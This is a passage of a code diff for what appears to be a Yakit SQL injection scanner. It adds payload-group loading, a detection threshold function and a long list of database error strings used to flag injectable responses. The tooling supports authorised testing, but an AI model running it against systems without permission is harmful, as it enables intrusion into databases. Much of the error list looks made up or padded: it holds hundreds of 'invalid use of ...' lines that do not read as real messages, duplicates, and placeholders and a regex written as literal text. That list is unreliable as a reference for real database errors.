+            println(sprintf("已添加临时 payload 检测组，共 %d 个 payload 变体（每个 payload 有 append 和 replace 两种模式）", len(finalPayloads)))
+        }
+    }
+
+    // ========== 加载 Yakit Payload（使用字符串拼接避免 f-string 问题） ==========
+    if yakitPayload != "" {
+        println(sprintf("正在加载 Yakit Payload: %s", yakitPayload))
+        
+        // 关键修改：使用字符串拼接而不是 f-string
+        tag = "{{payload(" + yakitPayload + ")}}"
+        rawLines = fuzz.Strings(tag)
+        println(sprintf("fuzz.Strings 返回长度: %d", len(rawLines)))
+        
+        // 打印原始行内容（调试用，可保留或删除）
+        for idx, line = range rawLines {
+            if len(line) > 0 {
+                println(sprintf("  行[%d] 长度=%d 内容前100字符: %s", idx+1, len(line), substring(line, 0, 100)))
+            } else {
+                println(sprintf("  行[%d] 空行", idx+1))
+            }
+        }
+        
+        // 合并所有行
+        combined = ""
+        for _, line = range rawLines {
+            combined += line
+        }
+        combined = str.TrimSpace(combined)
+        println(sprintf("合并后内容长度: %d", len(combined)))
+        
+        loadedGroups = 0
+        
+        if len(combined) == 0 {
+            println("⚠️ 合并后内容为空，请检查 Yakit Payload 内容")
+        } else {
+            // ========== 优先尝试：将整体内容解析为 JSON 数组或对象 ==========
+            try {
+                arr = json.loads(combined)
+                if type(arr) == "array" {
+                    println(sprintf("✅ 整体内容解析为 JSON 数组，共 %d 个元素", len(arr)))
+                    for idx, item = range arr {
+                        if type(item) == "map" && item["name"] != nil && item["payloads"] != nil && item["conditions"] != nil {
+                            detectionGroups = append(detectionGroups, item)
+                            loadedGroups++
+                            println(sprintf("   [%d] 加载检测组: %s", idx+1, item["name"]))
+                        } else {
+                            println(sprintf("   [%d] 跳过无效检测组: %v", idx+1, item))
+                        }
+                    }
+                } else if type(arr) == "map" {
+                    println("整体内容解析为单个 JSON 对象")
+                    if arr["name"] != nil && arr["payloads"] != nil && arr["conditions"] != nil {
+                        detectionGroups = append(detectionGroups, arr)
+                        loadedGroups++
+                        println(sprintf("加载检测组: %s", arr["name"]))
+                    } else {
+                        println("跳过无效对象")
+                    }
+                } else {
+                    println("整体内容不是 JSON 数组或对象，切换到按行解析模式")
+                    // 整体解析不成功，进入按行解析（密码字典模式）
+                    for _, line = range rawLines {
+                        line = str.TrimSpace(line)
+                        if line == "" { continue }
+                        try {
+                            parsed = json.loads(line)
+                            if type(parsed) == "array" {
+                                // 这一行是一个 JSON 数组，遍历其中的每个元素
+                                for _, item = range parsed {
+                                    if type(item) == "map" && item["name"] != nil && item["payloads"] != nil && item["conditions"] != nil {
+                                        detectionGroups = append(detectionGroups, item)
+                                        loadedGroups++
+                                        println(sprintf("   从行数组加载检测组: %s", item["name"]))
+                                    } else {
+                                        println(sprintf("   跳过行数组中无效元素: %v", item))
+                                    }
+                                }
+                            } else if type(parsed) == "map" {
+                                // 这一行是单个检测组对象
+                                if parsed["name"] != nil && parsed["payloads"] != nil && parsed["conditions"] != nil {
+                                    detectionGroups = append(detectionGroups, parsed)
+                                    loadedGroups++
+                                    println(sprintf("   从行对象加载检测组: %s", parsed["name"]))
+                                } else {
+                                    println(sprintf("   跳过无效对象: %v", parsed))
+                                }
+                            } else {
+                                println(sprintf("   跳过非数组/非对象行: %s", line))
+                            }
+                        } catch parseErr {
+                            println(sprintf("   跳过无法解析的行: %s", line))
+                        }
+                    }
+                }
+            } catch parseErr {
+                println(sprintf("❌ 整体 JSON 解析失败: %v，切换到按行解析模式", parseErr))
+                // 整体解析异常，进入按行解析
+                for _, line = range rawLines {
+                    line = str.TrimSpace(line)
+                    if line == "" { continue }
+                    try {
+                        parsed = json.loads(line)
+                        if type(parsed) == "array" {
+                            for _, item = range parsed {
+                                if type(item) == "map" && item["name"] != nil && item["payloads"] != nil && item["conditions"] != nil {
+                                    detectionGroups = append(detectionGroups, item)
+                                    loadedGroups++
+                                    println(sprintf("   从行数组加载检测组: %s", item["name"]))
+                                }
+                            }
+                        } else if type(parsed) == "map" {
+                            if parsed["name"] != nil && parsed["payloads"] != nil && parsed["conditions"] != nil {
+                                detectionGroups = append(detectionGroups, parsed)
+                                loadedGroups++
+                                println(sprintf("   从行对象加载检测组: %s", parsed["name"]))
+                            }
+                        }
+                    } catch parseErr2 {
+                        println(sprintf("   跳过无法解析的行: %s", line))
+                    }
+                }
+            }
+        }
+        
+        if loadedGroups > 0 {
+            println(sprintf("🎉 Yakit Payload 加载完成，共添加 %d 个检测组", loadedGroups))
+        } else {
+            println("⚠️ 未能从 Yakit Payload 加载任何检测组")
+        }
+    }
+
+    // === 添加阈值计算函数===
+    calculateThreshold = func(condition, group, factor, baselineSim) {
+        baseThreshold = condition["baseThreshold"]
+        if baseThreshold == nil {
+            baseThreshold = group["baseThreshold"]
+        }
+        if baseThreshold == nil {
+            baseThreshold = 0.95
+        }
+        baseFloat := float(baseThreshold)
+
+        groupType = group["type"]
+        typeFactor = 1.0
+        if groupType == "time" {
+            typeFactor = 0.1
+        } else if groupType == "error" {
+            typeFactor = 0.5
+        } else if groupType == "union" {
+            typeFactor = 0.8
+        } else if groupType == "boolean" {
+            typeFactor = 1.0
+        } else if groupType == "similarity" {
+            typeFactor = 1.0
+        }
+
+        result := baseFloat * factor * typeFactor
+
+        // 基线相似度校正：页面本身波动大时放宽阈值
+        if baselineSim > 0.5 {
+            correctFactor := baselineSim / 0.98
+            if correctFactor > 1.0 {
+                correctFactor = 1.0
+            }
+            result = result * correctFactor
+        }
+
+        if result > 1.0 {
+            result = 1.0
+        } else if result < 0.0 {
+            result = 0.0
+        }
+        return result
+    }
+
+
+    // 加载自定义 payload 文件（如果指定）
+    if customPayloadFile != "" {
+        println(sprintf("尝试加载自定义 payload 文件内容，长度: %d", len(customPayloadFile)))
+        try {
+            customGroups = json.loads(customPayloadFile)
+            // 判断是否为数组：尝试访问第一个元素，如果不 panic 则认为是数组
+            isArray = false
+            try {
+                first = customGroups[0]
+                isArray = true
+            } catch {
+                isArray = false
+            }
+
+            if isArray {
+                for _, group = range customGroups {
+                    // 使用 try-catch 安全地检查是否为有效检测组
+                    try {
+                        name = group["name"]
+                        payloads = group["payloads"]
+                        if name != nil && payloads != nil {
+                            detectionGroups = append(detectionGroups, group)
+                            println(sprintf("已加载自定义检测组: %s", name))
+                        } else {
+                            println(sprintf("自定义组缺少必要字段(name/payloads)，跳过: %v", group))
+                        }
+                    } catch {
+                        println(sprintf("自定义组不是对象，跳过: %v", group))
+                    }
+                }
+            } else {
+                println(sprintf("自定义 payload 文件内容不是数组，实际类型: %v", type(customGroups)))
+            }
+        } catch parseErr {
+            println(sprintf("解析自定义 payload 文件失败: %v", parseErr))
+        }
+    }
+
+    // === 多数据库错误特征库 ===
+    sensitiveKeywords = [
+        // ========== 通用数据库错误 ==========
+        "You have an error in your SQL syntax",
+        "SQL syntax error",
+        "syntax error at or near",
+        "parser: parse error",
+        "unexpected end of SQL command",
+        "could not execute query",
+        "failed to execute statement",
+        "unterminated quoted string",
+        "division by zero",
+        "data type mismatch",
+        "invalid parameter",
+        "unknown function",
+        "ambiguous column name",
+        "subquery must return only one column",
+        "too many SQL variables",
+        "SQL state",
+        "Database Error Occurred",
+        "Subquery returns more than",
+        "SqlException",
+        "SQLStatementException",
+        "PSQLException",
+        "SQL error",
+        "DB2 SQL error",
+        "Sybase message",
+
+        // ========== MySQL 相关错误 ==========
+        "MySQL Error",
+        "mysql_fetch",
+        "MySQL Error: 1064",
+        "mysql error with query",
+        "Warning: mysql_fetch_array",
+        "Warning: mysql_num_rows",
+        "Warning: mysql_query",
+        "Warning: mysql_fetch_assoc",
+        "Warning: mysql_result",
+        "mysql_fetch_row()",
+        "mysql_fetch_array()",
+        "mysql_num_rows()",
+        "mysql_fetch_assoc()",
+        "mysql_result()",
+        "mysql_pconnect()",
+        "mysql_connect()",
+        "MySQL server version for the right syntax to use",
+        "SQLSTATE[",  // PDO MySQL 错误前缀
+        "mysql_error()",
+        "mysqli_error()",
+        "mysqli_sql_exception",
+        "com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException",
+        "com.mysql.jdbc.exceptions.jdbc4.MySQLIntegrityConstraintViolationException",
+        "MySQLdb._exceptions.OperationalError",
+        "MySQLdb._exceptions.ProgrammingError",
+        "pymysql.err.OperationalError",
+        "pymysql.err.ProgrammingError",
+
+        // ========== PostgreSQL 相关错误 ==========
+        "PostgreSQL.*ERROR",
+        "Query failed: ERROR: syntax error at or near",
+        "PostgreSQL query failed: ERROR: parser: parse error",
+        "ERROR: parser: parse error",
+        "PostgreSQL query failed",
+        "Warning: pg_",
+        "PostgreSQL",
+        "pg_exec()",
+        "pg_query()",
+        "pg_fetch_array()",
+        "pg_fetch_row()",
+        "pg_fetch_assoc()",
+        "pg_result()",
+        "pg_connect()",
+        "pg_pconnect()",
+        "ERROR: invalid input syntax for type integer",
+        "ERROR: permission denied",
+        "ERROR: duplicate key value violates unique constraint",
+        "ERROR: division by zero",
+        "ERROR: current transaction is aborted",
+        "ERROR: invalid foreign key",
+        "psycopg2.OperationalError",
+        "psycopg2.IntegrityError",
+        "psycopg2.ProgrammingError",
+        "org.postgresql.util.PSQLException",
+
+        // ========== Microsoft SQL Server 相关错误 ==========
+        "Microsoft SQL Native Client error",
+        "Microsoft OLE DB Provider for ODBC Drivers error",
+        "Unclosed quotation mark",
+        "Msg 102, Level 15, State 1",
+        "Incorrect syntax near",
+        "Invalid object name",
+        "The EXECUTE permission was denied on the object",
+        "Conversion failed when converting",
+        "Arithmetic overflow error",
+        "String or binary data would be truncated",
+        "Cannot open database requested",
+        "A network-related or instance-specific error",
+        "Untrusted domain authentication",
+        "Violation of PRIMARY KEY constraint",
+        "Subquery returned more than 1 value",
+        "System.Data.SqlClient.SqlException",
+        "SQL Server",
+        "SQL Server driver",
+        "SQL Server Native Client",
+        "Invalid column name '",
+        "Invalid object name '",
+        "Invalid table name '",
+        "Could not find stored procedure",
+        "Cannot insert duplicate key",
+        "Violation of UNIQUE KEY constraint",
+        "Conflict with FOREIGN KEY constraint",
+        "The INSERT statement conflicted with the FOREIGN KEY constraint",
+        "Arithmetic overflow error converting",
+        "Divide by zero error encountered",
+        "String or binary data would be truncated",
+        "The conversion of a varchar data type to a datetime data type resulted in an out-of-range value",
+        "Insufficient result space to convert char value to date",
+        "The scale must be between 0 and the specified precision",
+        "The parameter is incorrect",
+        "The connection is closed",
+        "This SqlTransaction has completed; it is no longer usable",
+        "ExecuteNonQuery: Connection property has not been initialized",
+        "ExecuteReader: Connection property has not been initialized",
+        "ConnectionString property has not been initialized",
+        "Timeout expired",
+        "The timeout period elapsed prior to completion of the operation",
+        "A transport-level error has occurred",
+        "The underlying provider failed on Open",
+        "Unable to open the physical file",
+        "Cannot open database '",
+        "Login failed for user '",
+        "Login timeout expired",
+        "SSL Provider error",
+        "The certificate chain was issued by an authority that is not trusted",
+        "The SELECT permission was denied on the object",
+        "The INSERT permission was denied on the object",
+        "The UPDATE permission was denied on the object",
+        "The DELETE permission was denied on the object",
+        "EXECUTE permission denied on object",
+        "VIEW SERVER STATE permission denied",
+        "System.Data.Odbc.OdbcException",
+        "System.Data.OleDb.OleDbException",
+        "System.Data.SqlClient.SqlError",
+        "com.microsoft.sqlserver.jdbc.SQLServerException",
+
+        // ========== Oracle 相关错误 ==========
+        "ORA-00933: SQL command not properly ended",
+        "ORA-01756",
+        "ORA-00933:",
+        "ORA-01722:",
+        "ORA-00942:",
+        "ORA-01031:",
+        "ORA-00923:",
+        "ORA-00917:",
+        "ORA-00907:",
+        "ORA-01403:",
+        "ORA-01422:",
+        "ORA-06512:",
+        "ORA-0",
+        "Oracle error",
+        "ORA-",
+        "PLS-",
+        "TNS:",
+        "ORA-12541: TNS:no listener",
+        "ORA-12560: TNS:protocol adapter error",
+        "ORA-12154: TNS:could not resolve the connect identifier",
+        "ORA-28000: the account is locked",
+        "ORA-28001: the password has expired",
+        "cx_Oracle.DatabaseError",
+        "cx_Oracle.IntegrityError",
+        "cx_Oracle.ProgrammingError",
+
+        // ========== SQLite 相关错误 ==========
+        "SQLite error",
+        "sqlite_fetch_array()",
+        "sqlite_fetch_string()",
+        "sqlite_query()",
+        "sqlite_exec()",
+        "SQLite",
+        "SQLite3::query():",
+        "SQLite Error 1: '",
+        "SQLite Error 5: '",
+        "SQLite Error 8: '",
+        "SQLite Error 19: '",
+        "SQLite Error 206: '",
+        "near \"?\": syntax error",
+        "unrecognized token:",
+        "unable to open database file",
+        "database disk image is malformed",
+        "file is encrypted or is not a database",
+
+        // ========== Access / ODBC 相关错误 ==========
+        "JET Database Engine",
+        "ODBC Microsoft Access Driver",
+        "Microsoft Access",
+        "Access Database Engine",
+        "ADODB.Field error",
+        "Microsoft JET Database",
+        "error '80004005'",
+        "ODBC SQL",
+        "ODBC Driver",
+        "Warning: odbc_",
+
+        // ========== DB2 相关错误 ==========
+        "DB2 SQL Error: SQLCODE=-204",
+        "DB2 SQL Error: SQLSTATE=42704",
+        "DB2 SQL Error: SQLCODE=-206",
+        "DB2 SQL Error: SQLSTATE=42703",
+        "SQL0204N",
+        "SQL0440N",
+        "SQL0433N",
+
+        // ========== Sybase 相关错误 ==========
+        "Sybase: Message:",
+        "Sybase: Server message:",
+        "Sybase: SQL Anywhere Error",
+
+        // ========== 通用语法/表达式错误 ==========
+        "附近有语法错误",
+        "的字符串没有正确结束",
+        "Unclosed quotes",
+        "quoted string not properly terminated",
+        "string literal not terminated",
+        "missing expression",
+        "invalid number",
+        "not a valid month",
+        "group function is not allowed",
+        "missing right parenthesis",
+        "missing left parenthesis",
+        "missing right brace",
+        "missing left brace",
+        "missing right bracket",
+        "missing left bracket",
+        "missing semicolon",
+        "missing comma",
+        "missing operator",
+        "missing keyword",
+        "missing identifier",
+        "missing expression after",
+        "missing equal sign",
+        "missing quote",
+        "missing double quote",
+        "missing single quote",
+        "invalid string literal",
+        "malformed string literal",
+        "incomplete string literal",
+        "truncated string literal",
+        "invalid escape sequence",
+        "unrecognized escape sequence",
+        "invalid identifier",
+        "invalid column name",
+        "invalid table name",
+        "invalid database name",
+        "invalid schema name",
+        "invalid object name",
+
+        // ========== 连接/网络/超时错误 ==========
+        "Connection refused",
+        "Connection timed out",
+        "Cannot connect to MySQL server",
+        "Can't connect to local MySQL server through socket",
+        "No suitable driver found",
+        "Database connection failed",
+        "Connection is not available",
+        "Cannot get a connection",
+        "Connection pool exhausted",
+        "Timeout waiting for connection",
+        "Unable to acquire JDBC Connection",
+        "HikariPool - Connection is not available",
+        "data source is closed",
+        "broken pipe",
+        "Connection reset",
+        "Communications link failure",
+        "Connection refused: connect",
+        "Network error IOException",
+        "SocketException: Connection reset",
+        "Connection timed out: connect",
+        "No route to host",
+
+        // ========== 权限/认证错误 ==========
+        "Access denied for user",
+        "Login failed for user '",
+        "Authentication failed",
+        "Authorization failed",
+        "User does not have privilege",
+        "The EXECUTE permission was denied on the object",
+        "The SELECT permission was denied on the object",
+        "The INSERT permission was denied on the object",
+        "The UPDATE permission was denied on the object",
+        "The DELETE permission was denied on the object",
+        "EXECUTE permission denied on object",
+        "VIEW SERVER STATE permission denied",
+        "Invalid authorization specification",
+        "Untrusted domain authentication",
+
+        // ========== 数据类型/转换错误 ==========
+        "转换成数据类型 int 时失败",
+        "data type mismatch",
+        "Conversion failed when converting",
+        "Arithmetic overflow error",
+        "String or binary data would be truncated",
+        "The conversion of a varchar data type to a datetime data type resulted in an out-of-range value",
+        "Insufficient result space to convert char value to date",
+        "将 varchar 值 '",
+        "将数据类型 varchar 转换为 numeric 时出错。",
+        "发生数据类型 datetime 和 int 的加法运算时出错。",
+        "从字符串转换日期和/或时间时，转换失败。",
+        "数据类型转换错误",
+
+        // ========== 约束/重复/外键错误 ==========
+        "Violation of PRIMARY KEY constraint",
+        "Violation of UNIQUE KEY constraint",
+        "Conflict with FOREIGN KEY constraint",
+        "The INSERT statement conflicted with the FOREIGN KEY constraint",
+        "Cannot insert duplicate key",
+        "违反了 PRIMARY KEY 约束 '",
+        "违反了 UNIQUE KEY 约束 '",
+        "DELETE 语句与 REFERENCE 约束 '",
+        "UPDATE 语句与 FOREIGN KEY 约束 '",
+        "不能在具有唯一索引 '",
+        "唯一约束冲突",
+        "外键约束失败",
+
+        // ========== 事务/锁/死锁错误 ==========
+        "current transaction is aborted",
+        "This SqlTransaction has completed; it is no longer usable",
+        "事务已终止。",
+        "当前事务无法提交，也无法支持写入日志文件的操作。",
+        "该操作违反了事务的隔离级别。",
+        "该操作未能执行，因为已提交的事务正被回滚。",
+        "数据库镜像会话失败",
+        "org.springframework.dao.DeadlockLoserDataAccessException",
+        "事务处理失败",
+        "事务回滚",
+
+        // ========== 文件/磁盘/资源错误 ==========
+        "Can't create/write to file",
+        "Disk quota exceeded",
+        "No space left on device",
+        "Unable to open database file",
+        "database is locked",
+        "Unable to write to transaction log",
+        "Log file is full",
+        "无法创建文件",
+        "磁盘空间不足。",
+        "无法为数据库 '",
+        "中的对象 '",
+        "分配空间，因为文件组 '",
+        "已满。",
+        "日志文件已满。",
+        "事务日志已满。",
+        "已达到数据库大小的最大值。",
+
+        // ========== 中文错误提示 ==========
+        "查询失败",
+        "系统错误",
+        "内部错误",
+        "服务器错误",
+        "查询数据失败",
+        "数据保存失败",
+        "数据更新失败",
+        "数据删除失败",
+        "数据库操作异常",
+        "数据库执行错误",
+        "数据访问异常",
+        "数据服务异常",
+        "数据库繁忙",
+        "数据库连接超时",
+        "数据库连接异常",
+        "数据库服务器错误",
+        "数据查询超时",
+        "SQL执行异常",
+        "执行SQL出错",
+        "数据库错误，请稍后重试",
+        "系统数据异常",
+        "数据格式错误",
+        "参数错误",
+        "非法操作",
+        "权限不足",
+        "记录不存在",
+        "记录已存在",
+        "数据长度超出限制",
+        "字符串截断",
+        "除零错误",
+        "数值溢出",
+        "除数为零。",
+        "遇到以零作除数错误。",
+        "违反了最大大小",
+
+        // ========== 编程语言/数据库驱动异常 ==========
+        // PHP
+        "PDOException",
+        "PDOStatement::execute():",
+        "Fatal error: Uncaught PDOException",
+        "DBD::mysql::st execute failed",
+        "DBI connect failed",
+
+        // Python
+        "DatabaseError:",
+        "DataError:",
+        "IntegrityError:",
+        "InternalError:",
+        "ProgrammingError:",
+        "OperationalError:",
+        "NotSupportedError:",
+        "InterfaceError:",
+        "sqlalchemy.exc.IntegrityError",
+        "sqlalchemy.exc.ProgrammingError",
+        "sqlalchemy.exc.OperationalError",
+        "django.db.utils.IntegrityError",
+        "django.db.utils.OperationalError",
+        "django.db.utils.ProgrammingError",
+
+        // Java
+        "java.sql.SQLException",
+        "java.sql.SQLSyntaxErrorException",
+        "java.sql.SQLIntegrityConstraintViolationException",
+        "java.sql.SQLTimeoutException",
+
+        // Ruby
+        "ActiveRecord::StatementInvalid",
+        "ActiveRecord::JDBCError",
+        "Sequel::DatabaseError",
+
+        // ========== ORM/框架异常 ==========
+        "org.hibernate.exception.SQLGrammarException",
+        "org.hibernate.exception.ConstraintViolationException",
+        "org.hibernate.exception.DataException",
+        "org.hibernate.exception.JDBCConnectionException",
+        "org.springframework.dao.DataAccessException",
+        "org.springframework.jdbc.BadSqlGrammarException",
+        "org.springframework.dao.DuplicateKeyException",
+        "org.springframework.dao.DataIntegrityViolationException",
+        "org.springframework.dao.DeadlockLoserDataAccessException",
+        "org.springframework.dao.TransientDataAccessException",
+        "javax.persistence.PersistenceException",
+        "javax.persistence.RollbackException",
+        "org.apache.ibatis.exceptions.PersistenceException",
+        "org.apache.ibatis.executor.ExecutorException",
+        "mybatis.spring.MyBatisSystemException",
+        "com.baomidou.mybatisplus.core.exceptions.MybatisPlusException",
+
+        // ========== SQL Server 特定功能错误 (invalid use of ...) ==========
+        "invalid use of null value",
+        "invalid use of default value",
+        "invalid use of escape character",
+        "invalid use of user defined type",
+        "invalid use of array",
+        "invalid use of multiset",
+        "invalid use of row",
+        "invalid use of XML",
+        "invalid use of JSON",
+        "invalid use of spatial data",
+        "invalid use of hierarchyid",
+        "invalid use of geometry",
+        "invalid use of geography",
+        "invalid use of filetable",
+        "invalid use of filestream",
+        "invalid use of sparse column",
+        "invalid use of column set",
+        "invalid use of graph node",
+        "invalid use of graph edge",
+        "invalid use of graph path",
+        "invalid use of temporal table",
+        "invalid use of ledger table",
+        "invalid use of system-versioned table",
+        "invalid use of memory-optimized table",
+        "invalid use of natively compiled module",
+        "invalid use of interleaved execution",
+        "invalid use of batch mode",
+        "invalid use of row mode",
+        "invalid use of columnstore index",
+        "invalid use of clustered columnstore index",
+        "invalid use of nonclustered columnstore index",
+        "invalid use of filtered index",
+        "invalid use of spatial index",
+        "invalid use of XML index",
+        "invalid use of JSON index",
+        "invalid use of hash index",
+        "invalid use of range index",
+        "invalid use of full-text index",
+        "invalid use of semantic search",
+        "invalid use of partition function",
+        "invalid use of partition scheme",
+        "invalid use of data compression",
+        "invalid use of encryption",
+        "invalid use of transparent data encryption",
+        "invalid use of always encrypted",
+        "invalid use of dynamic data masking",
+        "invalid use of row-level security",
+        "invalid use of column-level security",
+        "invalid use of application role",
+        "invalid use of database role",
+        "invalid use of server role",
+        "invalid use of schema",
+        "invalid use of synonym",
+        "invalid use of sequence",
+        "invalid use of alias",
+        "invalid use of data type",
+        "invalid use of collation",
+        "invalid use of xml schema collection",
+        "invalid use of xml namespace",
+        "invalid use of assembly",
+        "invalid use of full-text catalog",
+        "invalid use of full-text stoplist",
+        "invalid use of search property list",
+        "invalid use of cryptographic provider",
+        "invalid use of credential",
+        "invalid use of audit",
+        "invalid use of server audit specification",
+        "invalid use of database audit specification",
+        "invalid use of encryption key",
+        "invalid use of certificate",
+        "invalid use of asymmetric key",
+        "invalid use of symmetric key",
+        "invalid use of master key",
+        "invalid use of service master key",
+        "invalid use of database master key",
+        "invalid use of backup",
+        "invalid use of restore",
+        "invalid use of snapshot",
+        "invalid use of replication",
+        "invalid use of change tracking",
+        "invalid use of change data capture",
+        "invalid use of query store",
+        "invalid use of in-memory OLTP",
+        "invalid use of hybrid buffer pool",
+        "invalid use of persistent memory",
+        "invalid use of secure enclave",
+        "invalid use of ledger",
+        "invalid use of polybase",
+        "invalid use of machine learning services",
+        "invalid use of graph",
+        "invalid use of json",
+        "invalid use of xml",
+        "invalid use of spatial",
+        "invalid use of hierarchyid",
+        "invalid use of filestream",
+        "invalid use of filetable",
+        "invalid use of sparse columns",
+        "invalid use of column sets",
+        "invalid use of computed columns",
+        "invalid use of persisted columns",
+        "invalid use of rowversion",
+        "invalid use of timestamp",
+        "invalid use of uniqueidentifier",
+        "invalid use of sql_variant",
+        "invalid use of table type",
+        "invalid use of user-defined table type",
+        "invalid use of table-valued parameter",
+        "invalid use of temporary table",
+        "invalid use of global temporary table",
+        "invalid use of table variable",
+        "invalid use of derived table",
+        "invalid use of common table expression",
+        "invalid use of recursive common table expression",
+        "invalid use of view",
+        "invalid use of indexed view",
+        "invalid use of partitioned view",
+        "invalid use of materialized view",
+        "invalid use of function",
+        "invalid use of scalar function",
+        "invalid use of table-valued function",
+        "invalid use of inline table-valued function",
+        "invalid use of multistatement table-valued function",
+        "invalid use of system function",
+        "invalid use of built-in function",
+        "invalid use of aggregate function",
+        "invalid use of window function",
+        "invalid use of analytic function",
+        "invalid use of ranking function",
+        "invalid use of rowset function",
+        "invalid use of openrowset",
+        "invalid use of openquery",
+        "invalid use of opendatasource",
+        "invalid use of linked server",
+        "invalid use of remote query",
+        "invalid use of distributed query",
+        "invalid use of cross-database query",
+        "invalid use of cross-instance query",
+        "invalid use of cross-platform query",
+        "invalid use of elastic query",
+        "invalid use of stored procedure",
+        "invalid use of extended stored procedure",
+        "invalid use of CLR stored procedure",
+        "invalid use of trigger",
+        "invalid use of DDL trigger",
+        "invalid use of DML trigger",
+        "invalid use of logon trigger",
+        "invalid use of CLR trigger",
+        "invalid use of instead of trigger",
+        "invalid use of after trigger",
+        "invalid use of nested trigger",
+        "invalid use of recursive trigger",
+        "invalid use of event notification",
+        "invalid use of query notification",
+        "invalid use of service broker",
+        "invalid use of conversation",
+        "invalid use of message type",
+        "invalid use of contract",
+        "invalid use of service",
+        "invalid use of route",
+        "invalid use of remote service binding",
+        "invalid use of broker priority",
+        "invalid use of event session",
+        "invalid use of extended event",
+        "invalid use of ring buffer target",
+        "invalid use of event counter target",
+        "invalid use of pair matching target",
+        "invalid use of synchronous event counter",
+        "invalid use of asynchronous event counter",
+        "invalid use of histogram target",
+        "invalid use of event file target",
+        "invalid use of event tracing for Windows target",
+        "invalid use of XML target",
+        "invalid use of event data",
+        "invalid use of event column",
+        "invalid use of event action",
+        "invalid use of event predicate",
+        "invalid use of event session",
+        "invalid use of server-scoped event",
+        "invalid use of database-scoped event",
+        "invalid use of application-scoped event",
+        "invalid use of event module",
+        "invalid use of event package",
+        "invalid use of event map",
+        "invalid use of event type",
+        "invalid use of event channel",
+        "invalid use of event keyword",
+        "invalid use of event opcode",
+        "invalid use of event task",
+        "invalid use of event resource",
+        "invalid use of event source",
+        "invalid use of event target",
+        "invalid use of event predicate",
+        "invalid use of event action",
+        "invalid use of event field",
+        "invalid use of event column",
+        "invalid use of event data",
+        "invalid use of event session",
+
+        // ========== 通用错误关键词 ==========
+        "Database error:",
+        "DB error:",
+        "SQL error:",
+        "Query failed:",
+        "Execute failed:",
+        "Statement failed:",
+        "Connection failed:",
+        "Unable to connect to database",
+        "Unknown database",
+        "Access denied",
+        "General SQL error",
+        "Invalid cursor state",
+        "Invalid descriptor index",
+        "Invalid transaction state",
+        "Invalid catalog name",
+        "Invalid schema name",
+        "Invalid collation name",
+        "Invalid condition number",
+        "Invalid connection name",
+        "Invalid cursor name",
+        "Invalid SQL statement name",
+        "Invalid SQL descriptor name",
+        "Invalid target type specification",
+        "Invalid transaction initiation",
+        "Invalid transaction termination",
+        "Invalid transaction name",
+        "invalid cursor position",
+        "invalid fetch orientation",
+        "invalid fetch direction",
+        "invalid row count in fetch",
+        //版本号和用户名
+        "root@localhost",
+        "testuser@localhost",
+        "myapp@'127.0.0.1'",
+        // ========== 通用 UNION 错误 ==========
+        "The used SELECT statements have a different number of columns",
+        "不同数目的列",
+        "query block has incorrect number of result columns",
+        "UNION 查询的列数不匹配",
+        "All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists",
+        "Each UNION query must have the same number of columns",
+        "UNION 操作的两边列数必须一致",
+
+        // ========== MySQL / MariaDB ==========
+        "The used SELECT statements have a different number of columns",
+        "Illegal mix of collations",
+        "Incorrect integer value",
+        "Data truncated for column",
+        "Truncated incorrect DOUBLE value",
+        "Incorrect usage of UNION and ORDER BY",
+        "Can't have ORDER BY in subquery of UNION",
+
+        // ========== PostgreSQL ==========
+        "ERROR: each UNION query must have the same number of columns",
+        "ERROR: SELECT has different number of columns",
+        "UNION types text and integer cannot be matched",
+        "could not determine polymorphic type because input has type unknown",
+        "invalid input syntax for type integer",
+        "UNION/INTERSECT/EXCEPT member statement cannot refer to other relations of same query level",
+        "each EXCEPT query must have the same number of columns",
+
+        // ========== Microsoft SQL Server ==========
+        "All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.",
+        "查询中的所有列必须具有相同的名称和类型，并且必须具有相同的数目。",
+        "Msg 205, Level 16, State 1",
+        "Conversion failed when converting the varchar value",
+        "Conversion failed when converting the nvarchar value",
+        "Operand type clash: int is incompatible with text",
+        "ORDER BY items must appear in the select list if the statement contains a UNION, INTERSECT or EXCEPT operator.",
+
+        // ========== Oracle Database ==========
+        "ORA-01789: query block has incorrect number of result columns",
+        "ORA-01790: expression must have same datatype as corresponding expression",
+        "ORA-00913: too many values",
+        "ORA-00947: not enough values",
+        "ORA-01722: invalid number",
+        "ORA-01858: a non-numeric character was found where a numeric was expected",
+        "ORA-00923: FROM keyword not found where expected",
+
+        // ========== SQLite ==========
+        "SELECTs to the left and right of UNION do not have the same number of result columns",
+        "ROW values must have the same number of columns in the left and right sides of UNION",
+        "Error: SELECTs to the left and right of UNION do not have the same number of result columns",
+        "datatype mismatch",
+        "cannot store TEXT value in numeric column",
+        "UNION by name is not supported",
+
+        // ========== IBM DB2 ==========
+        "SQL0150N The number of columns in the SELECT statement in a UNION, INTERSECT, or EXCEPT operation are not equal.",
+        "SQL0803N The number of columns in the SELECT statement is not equal to the number of columns in the preceding SELECT statement.",
+        "SQL0402N The data type, length, or value of an argument or parameter is invalid.",
+        "SQL0382C The result of a SELECT, UNION, INTERSECT, or EXCEPT operation is not compatible with the corresponding columns.",
+
+        // ========== Sybase ASE ==========
+        "All queries in a UNION or UNION ALL statement must have the same number of columns.",
+        "There are fewer columns in the SELECT clause of the query than in the previous query in the UNION.",
+        "Implicit conversion from datatype '...' to '...' is not allowed.",
+
+        // ========== Microsoft Access ==========
+        "The number of columns in the two selected tables or queries of a union query do not match.",
+        "查询的 SELECT 语句中指定了不同的字段数。",
+        "Syntax error (missing operator) in query expression '...'",
+
+        // ========== ORDER BY 位数越界专用特征（按数据库分类，实际数组中无需注释）==========
+        // MySQL / MariaDB
+        "Unknown column '",                     // 后面可能跟数字，如 '4'
+        "order clause",
+        "different number of columns",
+        "SQLSTATE[44000]",
+
+        // PostgreSQL
+        "ORDER BY position",
+        "not in SELECT list",
+        "each UNION query must have the same number of columns",
+
+        // Microsoft SQL Server
+        "ORDER BY number",
+        "out of range",
+        "must have an equal number of expressions",
+        "Msg 108",
+        "ORDER BY items must appear in the select list",
+
+        // Oracle
+        "ORA-01785",
+        "ORDER BY item must be the number",
+        "ORA-00913",
+        "ORA-00947",
+        "ORA-01789",
+
+        // SQLite
+        "ORDER BY column number",
+        "do not have the same number of result columns",
+        "Parse error: ORDER BY",
+
+        // IBM DB2
+        "SQL0150N",
+        "SQL0803N",
+        "number of columns not equal",
+
+        // Sybase ASE
